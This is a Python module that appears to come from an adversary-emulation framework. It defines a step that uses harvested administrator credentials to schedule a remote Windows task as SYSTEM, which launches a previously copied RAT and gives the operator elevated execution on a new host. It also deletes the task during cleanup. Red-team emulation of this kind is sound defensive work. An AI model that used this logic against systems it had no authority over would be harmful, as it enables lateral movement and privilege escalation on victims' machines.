from datetime import timedelta

from plugins.adversary.app.commands import schtasks
from ..operation.operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar, OPSchtask, \
    OPTimeDelta
from plugins.adversary.app.util import tz_utcnow


class Schtasks(Step):
    """
    Description:
        This step schedules a task on a remote machine, with the intent of starting a previously copied RAT.
    Requirements:
        Requires a knowledge of the target machine's current time state (usually accomplished using NetTime),
        credentials for an administrator on the target machine (needs both administrator enumeration 'GetAdmin',
        and credential data 'Credentials'), domain enumeration, and access to a copy of the RAT on the target
        machine (usually accomplished using Copy or XCopy).
    """
    attack_mapping = [('T1053', 'Execution'), ('T1053', 'Privilege Escalation')]
    display_name = "schtasks"
    summary = "Remotely schedule a task using schtasks"

    value = 20

    preconditions = [("rat", OPRat),
                     ('dest_host', OPHost),
                     ('time_delta', OPTimeDelta({"host": OPVar("dest_host")})),
                     ('rat_file', OPFile({'host': OPVar('dest_host'), 'use_case': 'rat'})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [('schtask_g', OPSchtask({"host": OPVar("dest_host")})),
                      ("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                       "executable": OPVar("rat_file.path")}))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['domain.windows_domain', 'time_delta.seconds', 'time_delta.microseconds', 'time_delta.days']

    postproperties = ["schtask_g.name", 'schtask_g.exe_path', "schtask_g.arguments", "schtask_g.user",
                      "schtask_g.cred", "schtask_g.start_time"]

    deterministic = True

    @staticmethod
    def description(rat, dest_host):
        return "Scheduling a task to execute on {}".format(dest_host.fqdn)

    @staticmethod
    async def simulate(operation, rat, time_delta, dest_host, user, rat_file, cred, domain, schtask_g, rat_g):
        return True

    @staticmethod
    async def action(operation, rat, time_delta, dest_host, user, rat_file, cred, domain, schtask_g, rat_g):
        delta = timedelta(seconds=time_delta['seconds'],
                          microseconds=time_delta['microseconds'],
                          days=time_delta['days'])

        task_name = 'caldera_task1'
        exe_path = rat_file.path
        arguments = '-d'

        t = tz_utcnow() - delta + timedelta(seconds=120)

        await operation.execute_shell_command(rat, *schtasks.create(task_name, exe_path, arguments=arguments,
                                                                    remote_host=dest_host.fqdn,
                                                                    user=user.username, user_domain=domain.windows_domain,
                                                                    password=cred.password, start_time=t,
                                                                    remote_user="SYSTEM"))

        await schtask_g({"name": task_name, 'exe_path': exe_path, "arguments": arguments, "user": user,
                         "cred": cred, "start_time": t})
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, schtask_g):
        for schtask in schtask_g:
            await cleaner.delete(schtask)
